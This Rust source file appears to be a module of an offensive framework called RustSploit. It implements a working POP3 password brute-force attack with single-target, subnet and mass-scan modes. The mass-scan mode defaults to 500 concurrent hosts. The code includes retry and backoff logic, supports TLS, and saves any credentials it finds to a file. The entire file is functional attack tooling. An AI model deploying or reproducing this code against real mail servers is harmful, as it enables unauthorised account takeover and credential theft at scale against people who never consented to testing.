use anyhow::{anyhow, Result};
use colored::*;
use native_tls::TlsConnector;
use std::net::IpAddr;
use std::time::Duration;

use crate::utils::{
    load_lines,
    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
};
use crate::modules::creds::utils::{
    BruteforceConfig, LoginResult, SubnetScanConfig,
    generate_combos, run_bruteforce, run_subnet_bruteforce,
    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
    backoff_delay,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "POP3 Brute Force".to_string(),
        description: "Brute-force POP3 authentication with SSL/TLS support. Tests credentials against POP3 mail servers with combo mode, retry logic, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Error Classification
// ============================================================================

#[derive(Debug, Clone, PartialEq)]
enum Pop3ErrorType {
    AuthenticationFailed,
    ConnectionRefused,
    ConnectionTimeout,
    TlsError,
    Unknown,
}

impl Pop3ErrorType {
    /// Classify a POP3 error from its message string for smarter retry decisions.
    fn classify_error(msg: &str) -> Self {
        let lower = msg.to_lowercase();
        if lower.contains("authentication")
            || lower.contains("login")
            || lower.contains("-err")
            || lower.contains("invalid credential")
            || lower.contains("bad password")
        {
            Self::AuthenticationFailed
        } else if lower.contains("refused")
            || lower.contains("reset")
            || lower.contains("broken pipe")
        {
            Self::ConnectionRefused
        } else if lower.contains("timeout")
            || lower.contains("timed out")
            || lower.contains("deadline")
        {
            Self::ConnectionTimeout
        } else if lower.contains("tls")
            || lower.contains("ssl")
            || lower.contains("certificate")
            || lower.contains("handshake")
        {
            Self::TlsError
        } else {
            Self::Unknown
        }
    }

    /// Whether this error type is worth retrying.
    fn is_retryable(&self) -> bool {
        matches!(self, Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::AuthenticationFailed => "Authentication failed",
            Self::ConnectionRefused => "Connection refused/reset",
            Self::ConnectionTimeout => "Connection timed out",
            Self::TlsError => "TLS/SSL error",
            Self::Unknown => "Unknown error",
        }
    }
}

#[derive(Debug)]
struct Pop3Error {
    error_type: Pop3ErrorType,
    message: String,
}

impl std::fmt::Display for Pop3Error {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[{}] {}", self.error_type.description(), self.message)
    }
}

impl std::error::Error for Pop3Error {}

impl Pop3Error {
    fn from_anyhow(err: anyhow::Error) -> Self {
        let msg = err.to_string();
        let error_type = Pop3ErrorType::classify_error(&msg);
        Self { error_type, message: msg }
    }
}

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
    crate::mprintln!();

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = std::sync::Arc::new(load_lines(&usernames_file)?);
        let passes = std::sync::Arc::new(load_lines(&passwords_file)?);
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        return run_mass_scan(target, MassScanConfig {
            protocol_name: "POP3",
            default_port: if use_ssl { 995 } else { 110 },
            state_file: "pop3_hose_state.log",
            default_output: "pop3_mass_results.txt",
            default_concurrency: 500,
        }, move |ip: IpAddr, port: u16| {
            let users = users.clone();
            let passes = passes.clone();
            async move {
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
                    return None;
                }

                let target_str = ip.to_string();
                for user in users.iter() {
                    for pass in passes.iter() {
                        let mut retry_attempt: u32 = 0;
                        let max_retries: u32 = 3;
                        let mut should_skip_host = false;
                        loop {
                            let t = target_str.clone();
                            let u = user.clone();
                            let p = pass.clone();
                            let res = tokio::task::spawn_blocking(move || {
                                attempt_pop3_login(&t, port, &u, &p, use_ssl, 5)
                            }).await;
                            match res {
                                Ok(Ok(true)) => {
                                    let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                    let line = format!("[{}] {}:{}:{}:{}\n", now, ip, port, user, pass);
                                    crate::mprintln!("\r{}", format!("[+] FOUND: {}:{}:{}:{}", ip, port, user, pass).green().bold());
                                    return Some(line);
                                }
                                Ok(Ok(false)) => break, // auth failed, try next credential
                                Ok(Err(e)) => {
                                    if e.error_type.is_retryable() && retry_attempt < max_retries {
                                        retry_attempt += 1;
                                        let delay = backoff_delay(500, retry_attempt, 8);
                                        tokio::time::sleep(delay).await;
                                        continue;
                                    }
                                    should_skip_host = true;
                                    break;
                                }
                                Err(_) => {
                                    should_skip_host = true;
                                    break;
                                }
                            }
                        }
                        if should_skip_host {
                            return None;
                        }
                    }
                }
                None
            }
        }).await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
        let default_port = if use_ssl { 995 } else { 110 };
        let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "pop3_subnet_results.txt").await?;

        let connection_timeout: u64 = 5;

        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "pop3",
            source_module: "creds/generic/pop3_bruteforce",
            skip_tcp_check: false,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            async move {
                let target_str = ip.to_string();
                let res = tokio::task::spawn_blocking(move || {
                    attempt_pop3_login(&target_str, port, &user, &pass, use_ssl, connection_timeout)
                }).await;
                match res {
                    Ok(Ok(true)) => LoginResult::Success,
                    Ok(Ok(false)) => LoginResult::AuthFailed,
                    Ok(Err(e)) => LoginResult::Error {
                        message: e.message,
                        retryable: e.error_type.is_retryable(),
                    },
                    Err(e) => LoginResult::Error {
                        message: format!("Task panic: {}", e),
                        retryable: false,
                    },
                }
            }
        }).await;
    }

    // --- Single Target Mode ---
    let use_ssl = cfg_prompt_yes_no("use_ssl", "Use SSL/TLS (POP3S)?", false).await?;
    let default_port = if use_ssl { 995 } else { 110 };

    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;

    let threads = cfg_prompt_int_range("threads", "Threads", 16, 1, 256).await? as usize;
    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000).await? as u64;
    let connection_timeout = cfg_prompt_int_range("timeout", "Timeout (s)", 5, 1, 60).await? as u64;

    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false).await?;
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", false).await?;

    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "pop3_results.txt").await?;

    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry failed connections?", true).await?;
    let max_retries = if retry_on_error {
        cfg_prompt_int_range("max_retries", "Max retries", 2, 1, 10).await? as usize
    } else {
        0
    };

    let usernames = load_lines(&username_wordlist)?;
    let passwords = load_lines(&password_wordlist)?;
    if usernames.is_empty() || passwords.is_empty() {
        anyhow::bail!("Username or password list is empty — nothing to bruteforce");
    }

    crate::mprintln!("[*] Loaded {} usernames, {} passwords", usernames.len(), passwords.len());

    let combos = generate_combos(&usernames, &passwords, full_combo);

    crate::mprintln!();
    crate::mprintln!("{}", "[Starting Attack]".bold().yellow());
    crate::mprintln!();

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        async move {
            let res = tokio::task::spawn_blocking(move || {
                attempt_pop3_login(&t, p, &user, &pass, use_ssl, connection_timeout)
            }).await;
            match res {
                Ok(Ok(true)) => LoginResult::Success,
                Ok(Ok(false)) => LoginResult::AuthFailed,
                Ok(Err(e)) => LoginResult::Error {
                    message: e.message,
                    retryable: e.error_type.is_retryable(),
                },
                Err(e) => LoginResult::Error {
                    message: format!("Task panic: {}", e),
                    retryable: false,
                },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency: threads,
        stop_on_success,
        verbose,
        delay_ms,
        max_retries,
        service_name: "pop3",
        source_module: "creds/generic/pop3_bruteforce",
    }, combos, try_login).await?;

    result.print_found();
    result.save_to_file(&output_file)?;

    Ok(())
}

/// POP3 login result: Ok(true) = authenticated, Ok(false) = auth rejected, Err = classified error.
/// Shared POP3 authentication logic for both SSL and plain connections.
fn pop3_authenticate(stream: &mut (impl std::io::Read + std::io::Write), user: &str, pass: &str) -> std::result::Result<bool, Pop3Error> {
    let mut buffer = [0; 1024];
    // Read banner
    stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;

    // Send USER
    stream.write_all(format!("USER {}\r\n", user).as_bytes())
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    if !String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
        return Ok(false);
    }

    // Send PASS
    stream.write_all(format!("PASS {}\r\n", pass).as_bytes())
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    let n = stream.read(&mut buffer).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    if String::from_utf8_lossy(&buffer[..n]).starts_with("+OK") {
        if let Err(e) = stream.write_all(b"QUIT\r\n") { crate::meprintln!("[!] POP3 QUIT write error: {}", e); }
        if let Err(e) = stream.flush() { eprintln!("[!] Flush error: {}", e); }
        return Ok(true);
    }

    Ok(false)
}

fn attempt_pop3_login(target: &str, port: u16, user: &str, pass: &str, use_ssl: bool, timeout_secs: u64) -> std::result::Result<bool, Pop3Error> {
    let addr = format!("{}:{}", target, port);
    let timeout = Duration::from_secs(timeout_secs);

    let socket_addr = std::net::ToSocketAddrs::to_socket_addrs(&addr)
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?
        .next()
        .ok_or_else(|| Pop3Error { error_type: Pop3ErrorType::ConnectionRefused, message: "Resolution failed".to_string() })?;
    let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)
        .map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    if let Err(e) = stream.set_nodelay(true) { crate::meprintln!("[!] Socket option error: {}", e); }
    stream.set_read_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;
    stream.set_write_timeout(Some(timeout)).map_err(|e| Pop3Error::from_anyhow(e.into()))?;

    if use_ssl {
        let connector = TlsConnector::new().map_err(|e| Pop3Error {
            error_type: Pop3ErrorType::TlsError,
            message: e.to_string(),
        })?;
        let mut tls_stream = connector.connect(target, stream).map_err(|e| Pop3Error {
            error_type: Pop3ErrorType::TlsError,
            message: e.to_string(),
        })?;
        pop3_authenticate(&mut tls_stream, user, pass)
    } else {
        let mut plain_stream = stream;
        pop3_authenticate(&mut plain_stream, user, pass)
    }
}
